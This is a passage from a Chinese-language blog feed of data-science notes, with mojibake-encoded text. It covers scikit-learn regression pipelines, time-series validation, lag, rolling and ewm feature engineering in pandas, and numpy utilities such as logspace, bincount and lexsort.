class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_m</span>(<span class="params">m=&#123;&#125;</span>):</span><br><span class="line">    m[<span class="string">&#x27;RandomForestRegressor&#x27;</span>] = RandomForestRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;GradientBoostingRegressor&#x27;</span>] = GradientBoostingRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;ExtraTreesRegressor&#x27;</span>] = ExtraTreesRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;LGBMRegressor&#x27;</span>] = LGBMRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;LinearRegression&#x27;</span>] = LinearRegression()</span><br><span class="line">    m[<span class="string">&#x27;HuberRegressor&#x27;</span>] = HuberRegressor()</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_df</span>(<span class="params">df,name</span>):</span><br><span class="line">    train = df[:tr.shape[<span class="number">0</span>]]</span><br><span class="line">    test = df[tr.shape[<span class="number">0</span>]:]</span><br><span class="line">    x = train.drop(name,<span class="number">1</span>)</span><br><span class="line">    x_pre = test.drop(name,<span class="number">1</span>)</span><br><span class="line">    y = train[name]</span><br><span class="line">    <span class="keyword">return</span> x,y,x_pre</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_p</span>(<span class="params">l,m</span>):</span><br><span class="line">    s = l.copy()</span><br><span class="line">    s.append((<span class="string">&#x27;m&#x27;</span>,m))</span><br><span class="line">    <span class="keyword">return</span> Pipeline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_cv</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    tss = TimeSeriesSplit(n_splits=cv)</span><br><span class="line">    <span class="keyword">for</span> tri,tei <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        Xtr,Xte = x.iloc[tri,:],x.iloc[tei]</span><br><span class="line">        Ytr,Yte = y.iloc[tri],y.iloc[tei]</span><br><span class="line">        ans = p.fit(Xtr,Ytr).predict(Xte)</span><br><span class="line">        <span class="keyword">if</span> log:</span><br><span class="line">            ans = np.expm1(ans)</span><br><span class="line">        s+=r2_score(Yte,ans)</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_df</span>(<span class="params">l,df,name,log=<span class="literal">True</span>,s=&#123;&#125;,func=valid</span>):</span><br><span class="line">    x,y,x_pre = split_df(df,name)</span><br><span class="line">    <span class="keyword">if</span> log:</span><br><span class="line">        y = np.log1p(y)</span><br><span class="line">    <span class="keyword">for</span> n,m <span class="keyword">in</span> make_m().items():</span><br><span class="line">        p = make_p(l,m)</span><br><span class="line">        s[n] = func(p,x,y)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="diffå·®åˆ†x2fshiftå¹³ç§»x2fewmx2frolling">diffå·®åˆ†&#x2F;shiftå¹³ç§»&#x2F;ewm&#x2F;rolling</span></h2><p>ä¸»è¦ç”¨äºç‰¹å¾åˆ¶ä½œlagçš„å€¼ï¼Œå¯ä»¥å¤šå°è¯•ï¼Œtargetå€¼ä¹Ÿå¯ä»¥å°è¯•ewmï¼Œä½†æ˜¯è¿™é“é¢˜æ²¡ç”¨ã€‚</p><ul><li>diff(i)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">&#x27;Temperature&#x27;</span>,<span class="string">&#x27;Humidity&#x27;</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f&#x27;<span class="subst">&#123;f&#125;</span>_lag_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = df[f].diff(i).bfill()</span><br></pre></td></tr></table></figure><ul><li>rolling.mean()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">&#x27;Temperature&#x27;</span>,<span class="string">&#x27;Humidity&#x27;</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f&#x27;<span class="subst">&#123;f&#125;</span>_rolling_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = df[f].rolling(i).mean().bfill()</span><br></pre></td></tr></table></figure><ul><li>ewm æ ‡ç­¾(å¯èƒ½æ•°æ®æ³„éœ²ï¼Ÿ)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ts_ft</span>(<span class="params">x, by, on</span>):</span><br><span class="line">    x.sort_values(by+[<span class="string">&#x27;dt&#x27;</span>], inplace=<span class="literal">True</span>)</span><br><span class="line">    names = [<span class="string">&#x27;mean&#x27;</span>, <span class="string">&#x27;std&#x27;</span>, <span class="string">&#x27;median&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;skew&#x27;</span>, <span class="string">&#x27;kurt&#x27;</span>]</span><br><span class="line">    sta = &#123;s:[] <span class="keyword">for</span> s <span class="keyword">in</span> names&#125;</span><br><span class="line">    alphas = [<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.5</span>, <span class="number">0.7</span>, <span class="number">0.9</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">        sta[<span class="string">&#x27;ewm_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a)] = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _, g <span class="keyword">in</span> x.groupby(by):</span><br><span class="line">        val = g[on]</span><br><span class="line">        rolled = val.rolling(window=<span class="built_in">len</span>(g), min_periods=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> names:</span><br><span class="line">            sta[s].extend(<span class="built_in">getattr</span>(rolled, s)().fillna(method=<span class="string">&#x27;bfill&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">            ewm = val.ewm(alpha=a, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">            sta[<span class="string">&#x27;ewm_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a)].extend(ewm)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> sta:</span><br><span class="line">        ft_name = <span class="string">&#x27;&#123;&#125;_on_&#123;&#125;_by_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, on, by)</span><br><span class="line">        x[ft_name] = sta[s]</span><br></pre></td></tr></table></figure><ul><li>ewm ç‰¹å¾å˜é‡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">time_series_feature</span>(<span class="params">X,days=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> np.linspace(<span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="comment">#     X_train[f&quot;&#123;alpha&#125;ewm_var1&quot;] = X_train[&#x27;var1&#x27;].ewm(alpha=alpha).mean()</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> [<span class="string">&#x27;temperature&#x27;</span>, <span class="string">&#x27;windspeed&#x27;</span>]:</span><br><span class="line">            X[<span class="string">f&quot;<span class="subst">&#123;alpha&#125;</span>ewm_<span class="subst">&#123;n&#125;</span>&quot;</span>] = X[n].shift(days).ewm(alpha=alpha, adjust=<span class="literal">False</span>).mean().bfill()</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> [<span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;temperature&#x27;</span>, <span class="string">&#x27;windspeed&#x27;</span>]:</span><br><span class="line">            w = <span class="built_in">int</span>(alpha*<span class="number">20</span>)</span><br><span class="line">            <span class="comment"># rolled = X[m].shift().rolling(window=w, min_periods=1)</span></span><br><span class="line">            X[<span class="string">f&quot;<span class="subst">&#123;w&#125;</span>std_<span class="subst">&#123;m&#125;</span>&quot;</span>] = X[m].shift(days).rolling(window=w, min_periods=<span class="number">1</span>).std().bfill()</span><br><span class="line">    <span class="keyword">return</span> X</span><br></pre></td></tr></table></figure><ul><li>lagging æ ‡ç­¾ï¼ˆå¯èƒ½æ²¡å•¥ç”¨ï¼Œç¼ºå¤±å€¼å¤ªå¤šäº†ï¼‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_lagging</span>(<span class="params">df, df_original, i</span>):</span><br><span class="line">    df1 = df_original.copy()</span><br><span class="line">    df1[<span class="string">&#x27;visit_date&#x27;</span>] = df1[<span class="string">&#x27;visit_date&#x27;</span>] + pd.DateOffset(</span><br><span class="line">        days=i)</span><br><span class="line">    df1 = df1.rename(columns=&#123;<span class="string">&#x27;visitors&#x27;</span>: <span class="string">&#x27;lagging&#x27;</span> + <span class="built_in">str</span>(i)&#125;)</span><br><span class="line">    df2 = pd.merge(df,</span><br><span class="line">                   df1[[<span class="string">&#x27;air_store_id&#x27;</span>, <span class="string">&#x27;visit_date&#x27;</span>, <span class="string">&#x27;lagging&#x27;</span> + <span class="built_in">str</span>(i)]],</span><br><span class="line">                   on=[<span class="string">&#x27;air_store_id&#x27;</span>, <span class="string">&#x27;visit_date&#x27;</span>],</span><br><span class="line">                   how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> df2</span><br><span class="line">  </span><br><span class="line">lagging = <span class="number">21</span></span><br><span class="line">data1 = df.copy()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, lagging+<span class="number">1</span>):</span><br><span class="line">    data1 = create_lagging(data1, df, i)</span><br></pre></td></tr></table></figure><h2><span id="éªŒè¯æ–¹æ³•">éªŒè¯æ–¹æ³•</span></h2><ul><li>åªèƒ½çœ‹æ˜¯å¦æ”¹è¿›äº†ï¼Œä½†æ˜¯åˆ†æ•°åä½</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¯æ¬¡å¾ªç¯éƒ½ä¼šå¢å¤§Xï¼Œåœ¨è¿™é¢˜æ¯”è¾ƒå‡†ç¡®ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">p,X,y,cv=<span class="number">5</span></span>):</span><br><span class="line">    tss = TimeSeriesSplit(max_train_size=<span class="literal">None</span>, n_splits=cv)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr_i,te_i <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        <span class="comment"># print(tr_i)</span></span><br><span class="line">        X_train,X_test = X.iloc[tr_i,:],X.iloc[te_i,:]</span><br><span class="line">        y_train,y_test = y.iloc[tr_i,:],y.iloc[te_i,:]</span><br><span class="line">        <span class="comment"># y_train,y_test = y.iloc[tr_i],y.iloc[te_i] yä¸ºä¸€ç»´çš„æ—¶å€™</span></span><br><span class="line">        s+=r2_score(y_test,p.fit(X_train,y_train).predict(X_test))</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br></pre></td></tr></table></figure><ul><li>ç»å…¸çš„äº¤å‰éªŒè¯åˆ†æ•°æ¯”è¾ƒé«˜ï¼Œèƒ½æŠŠæ§ä¸€ä¸‹å¤§æ¦‚æ–¹å‘å¯¹ä¸å¯¹ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">valid_cv</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æœºå™¨å­¦ä¹ " scheme="https://disda-coding.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="æœºå™¨å­¦ä¹  å¤§æ•°æ® pandas" scheme="https://disda-coding.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE-pandas/"/>
    
  </entry>
  
  <entry>
    <title>å¤§æ•°æ®å»ºæ¨¡</title>
    <link href="https://disda-coding.github.io/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/"/>
    <id>https://disda-coding.github.io/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/</id>
    <published>2022-02-14T02:58:06.000Z</published>
    <updated>2023-11-03T06:50:37.310Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E9%99%8D%E7%BB%B4">é™ç»´</a></li><li><a href="#npset_printoptions">np.set_printoptions</a></li><li><a href="#bicount">bicount</a></li><li><a href="#lexsort">lexsort</a></li><li><a href="#%E7%BB%83%E4%B9%A0%E9%A2%98">ç»ƒä¹ é¢˜</a></li></ul><ul><li><a href="#trick">Trick</a></li><li><a href="#matplotlib">Matplotlib</a><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">åŸºæœ¬æ“ä½œ</a></li><li><a href="#%E9%A3%8E%E6%A0%BC">é£æ ¼</a></li><li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%94%BB%E5%9B%BE">é¢å‘å¯¹è±¡ç”»å›¾</a></li></ul></li><li><a href="#%E7%BB%93%E5%90%88pandas%E7%94%BB%E5%9B%BE">ç»“åˆpandasç”»å›¾</a></li><li><a href="#sklearn">sklearn</a><ul><li><a href="#%E5%86%B3%E7%AD%96%E6%A0%91">å†³ç­–æ ‘</a><ul><li><a href="#%E5%89%AA%E6%9E%9D%E7%AD%96%E7%95%A5">å‰ªæç­–ç•¥</a></li></ul></li><li><a href="#%E5%9B%9E%E5%BD%92%E6%A0%91">å›å½’æ ‘</a></li><li><a href="#%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97">éšæœºæ£®æ—</a></li><li><a href="#%E9%A2%84%E5%A4%84%E7%90%86">é¢„å¤„ç†</a><ul><li><a href="#%E6%96%B9%E5%B7%AE%E8%BF%87%E6%BB%A4"><strong>æ–¹å·®è¿‡æ»¤</strong></a></li><li><a href="#%E5%8D%A1%E6%96%B9%E8%BF%87%E6%BB%A4">å¡æ–¹è¿‡æ»¤</a></li><li><a href="#f%E6%A3%80%E9%AA%8C%E5%8F%AA%E8%83%BD%E6%A3%80%E9%AA%8C%E7%BA%BF%E6%80%A7%E5%85%B3%E7%B3%BB">Fæ£€éªŒï¼ˆåªèƒ½æ£€éªŒçº¿æ€§å…³ç³»ï¼‰</a></li><li><a href="#%E4%BA%92%E4%BF%A1%E6%81%AF%E6%B3%95">äº’ä¿¡æ¯æ³•</a></li></ul></li><li><a href="#%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B">ç‰¹å¾å·¥ç¨‹</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">æ•°æ®é¢„å¤„ç†</a></li><li><a href="#%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92">é€»è¾‘å›å½’</a></li><li><a href="#perceptrons">Perceptrons</a></li><li><a href="#logisticregression">LogisticRegression</a></li></ul></li><li><a href="#%E5%81%9A%E9%A2%98%E9%81%87%E5%88%B0%E7%9A%84">åšé¢˜é‡åˆ°çš„</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96map">æ•°æ®æ ¼å¼åŒ–map</a></li><li><a href="#%E7%B4%A2%E5%BC%95">ç´¢å¼•</a></li><li><a href="#%E5%9D%90%E6%A0%87%E8%BD%B4%E6%98%BE%E7%A4%BA%E7%99%BE%E5%88%86%E6%AF%94">åæ ‡è½´æ˜¾ç¤ºç™¾åˆ†æ¯”</a></li><li><a href="#apply">apply</a></li><li><a href="#%E9%87%8D%E9%87%87%E6%A0%B7">é‡é‡‡æ ·</a></li><li><a href="#del">del</a></li><li><a href="#%E6%8C%89%E6%97%B6%E9%97%B4%E7%AD%9B%E9%80%89">æŒ‰æ—¶é—´ç­›é€‰</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87">æ˜¾ç¤ºä¸­æ–‡</a></li><li><a href="#%E9%87%8D%E5%91%BD%E5%90%8D">é‡å‘½å</a></li><li><a href="#%E5%A1%AB%E5%85%85">å¡«å……</a></li><li><a href="#%E6%9F%A5%E8%AF%A2">æŸ¥è¯¢</a></li><li><a href="#%E9%80%89%E6%8B%A9%E7%B1%BB%E5%9E%8B">é€‰æ‹©ç±»å‹</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%B1%95%E5%BC%80">æ•°æ®å±•å¼€</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%B4%AF%E5%8A%A0">æ•°æ®ç´¯åŠ </a></li><li><a href="#%E5%88%97%E6%93%8D%E4%BD%9C">åˆ—æ“ä½œ</a></li><li><a href="#%E8%A1%8C%E6%93%8D%E4%BD%9C">è¡Œæ“ä½œ</a></li><li><a href="#pivot%E4%B8%8Egroupby">pivotä¸groupby</a></li><li><a href="#unstack">unstack</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E8%81%9A%E5%90%88">æ•°æ®èšåˆ</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2">æ•°æ®æŸ¥è¯¢</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%B1%87%E6%80%BB">æ•°æ®æ±‡æ€»</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%90%88%E5%B9%B6">æ•°æ®åˆå¹¶</a></li><li><a href="#%E5%A4%9A%E4%B8%AAdf%E7%94%BB%E4%B8%80%E8%B5%B7">å¤šä¸ªDFç”»ä¸€èµ·</a></li><li><a href="#%E5%88%86%E6%9E%90%E5%92%8C%E6%8E%92%E5%BA%8F">åˆ†æå’Œæ’åº</a></li><li><a href="#%E5%8F%8C%E7%BA%B5%E5%9D%90%E6%A0%87%E8%BD%B4">åŒçºµåæ ‡è½´</a></li><li><a href="#%E6%9E%84%E5%BB%BA%E7%A9%BAdf">æ„å»ºç©ºDF</a></li><li><a href="#%E6%9B%B4%E6%94%B9%E6%97%A5%E6%9C%9F%E9%97%B4%E9%9A%94">æ›´æ”¹æ—¥æœŸé—´éš”</a></li><li><a href="#%E6%9F%A5%E7%9C%8B%E7%BB%9F%E8%AE%A1%E6%95%B0%E6%8D%AE">æŸ¥çœ‹ç»Ÿè®¡æ•°æ®</a></li><li><a href="#%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6">ä¿å­˜æ–‡ä»¶</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86-1">æ•°æ®é¢„å¤„ç†</a></li><li><a href="#%E5%88%A0%E9%99%A4%E7%A9%BA%E8%A1%8C">åˆ é™¤ç©ºè¡Œ</a></li><li><a href="#%E6%9B%BF%E6%8D%A2">æ›¿æ¢</a></li></ul></li><li><a href="#%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93">ç®—æ³•æ€»ç»“</a><ul><li><a href="#%E5%86%B3%E7%AD%96%E6%A0%91-1">å†³ç­–æ ‘</a></li></ul></li></ul><!-- tocstop --><h3><span id="é™ç»´">é™ç»´</span></h3><ul><li>ravel()ï¼šå¦‚æœæ²¡æœ‰å¿…è¦ï¼Œä¸ä¼šäº§ç”Ÿæºæ•°æ®çš„å‰¯æœ¬ </li><li>flatten()ï¼šè¿”å›æºæ•°æ®çš„å‰¯æœ¬ </li><li>squeeze()ï¼šåªèƒ½å¯¹ç»´æ•°ä¸º1çš„ç»´åº¦é™ç»´</li><li>logspace ç”¨äºåˆ›å»ºç­‰æ¯”æ•°åˆ—</li></ul><p>å‡å¦‚ï¼Œæˆ‘ä»¬æƒ³è¦æ”¹å˜åŸºæ•°ï¼Œä¸è®©å®ƒä»¥10ä¸ºåº•æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜baseå‚æ•°ï¼Œå°†å…¶è®¾ç½®ä¸º2è¯•è¯•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.logspace(<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,base=<span class="number">2</span>)</span><br><span class="line">a</span><br><span class="line">array([   <span class="number">1.</span>,    <span class="number">2.</span>,    <span class="number">4.</span>,    <span class="number">8.</span>,   <span class="number">16.</span>,   <span class="number">32.</span>,   <span class="number">64.</span>,  <span class="number">128.</span>,  <span class="number">256.</span>,  <span class="number">512.</span>])</span><br></pre></td></tr></table></figure><h3><span id="npset_printoptions">np.set_printoptions</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.set_printoptions(precision=None, threshold=None, edgeitems=None, linewidth=None, suppress=None, nanstr=None, infstr=None)</span><br></pre></td></tr></table></figure><p><strong>precision :</strong></p><p>ã€€ã€€int, optionalï¼Œfloatè¾“å‡ºçš„ç²¾åº¦ï¼Œå³å°æ•°ç‚¹åç»´æ•°ï¼Œé»˜è®¤8ï¼ˆ Number of digits of precision for floating point output (default 8)ï¼‰</p><p><strong>threshold :</strong></p><p>ã€€ã€€int, optionalï¼Œå½“æ•°ç»„æ•°ç›®è¿‡å¤§æ—¶ï¼Œè®¾ç½®æ˜¾ç¤ºå‡ ä¸ªæ•°å­—ï¼Œå…¶ä½™ç”¨çœç•¥å·ï¼ˆTotal number of array elements which trigger summarization rather than full repr (default 1000).ï¼‰</p><p><strong>edgeitems :</strong></p><p>ã€€ã€€ int, optionalï¼Œè¾¹ç¼˜æ•°ç›®ï¼ˆNumber of array items in summary at beginning and end of each dimension (default 3)ï¼‰.</p><p><strong>linewidth :</strong></p><p>ã€€ã€€ int, optionalï¼Œçº¿æ¡å®½åº¦ The number of characters per line for the purpose of inserting line breaks (default 75).</p><p><strong>suppress :</strong></p><p>ã€€ã€€ bool, optionalï¼Œæ˜¯å¦å‹ç¼©ç”±ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„æµ®ç‚¹æ•°ï¼ˆWhether or not suppress printing of small floating point values using scientific notation (default False).ï¼‰</p><p><strong>nanstr :</strong></p><p>ã€€ã€€ str, optionalï¼ŒString representation of floating point not-a-number (default nan).</p><p><strong>infstr :</strong></p><p>ã€€ã€€str, optionalï¼ŒString representation of floating point infinity (default inf).</p><h3><span id="bicount">bicount</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­æœ€å¸¸å‡ºç°çš„æ•°å­—</span></span><br><span class="line">z = np.random.randint(<span class="number">0</span>,<span class="number">10</span>,<span class="number">50</span>)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line"><span class="built_in">print</span>(np.bincount(z))</span><br><span class="line"><span class="built_in">print</span>(np.argmax(np.bincount(z)))</span><br><span class="line"></span><br><span class="line">[<span class="number">9</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span> <span class="number">7</span> <span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">2</span> <span class="number">5</span> <span class="number">7</span> <span class="number">7</span> <span class="number">3</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">6</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">6</span> <span class="number">7</span> <span class="number">0</span> <span class="number">9</span> <span class="number">4</span> <span class="number">5</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">7</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">2</span> <span class="number">1</span> <span class="number">9</span> <span class="number">5</span> <span class="number">0</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">8</span> <span class="number">3</span>]</span><br><span class="line">[<span class="number">5</span> <span class="number">3</span> <span class="number">3</span> <span class="number">3</span> <span class="number">5</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span> <span class="number">6</span> <span class="number">5</span>]</span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>å…¶å®bicountå°†ç»“æœæ˜ å°„æˆä¸€ä¸ªlistï¼Œåˆ†åˆ«ä»£è¡¨0å‡ºç°çš„æ¬¡æ•°ï¼Œ1å‡ºç°çš„æ¬¡æ•°ã€‚ã€‚ã€‚</p><p>æ‰¾åˆ°å‡ºç°æœ€å¤šæ¬¡æ•°çš„ä¸‹æ ‡å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­æœ€å¸¸å‡ºç°çš„æ•°å­—</p><h3><span id="lexsort">lexsort</span></h3><p>numpy.lexsort() ç”¨äºå¯¹å¤šä¸ªåºåˆ—è¿›è¡Œæ’åºã€‚æŠŠå®ƒæƒ³è±¡æˆå¯¹ç”µå­è¡¨æ ¼è¿›è¡Œæ’åºï¼Œæ¯ä¸€åˆ—ä»£è¡¨ä¸€ä¸ªåºåˆ—ï¼Œ<strong>æ’åºæ—¶ä¼˜å…ˆç…§é¡¾é 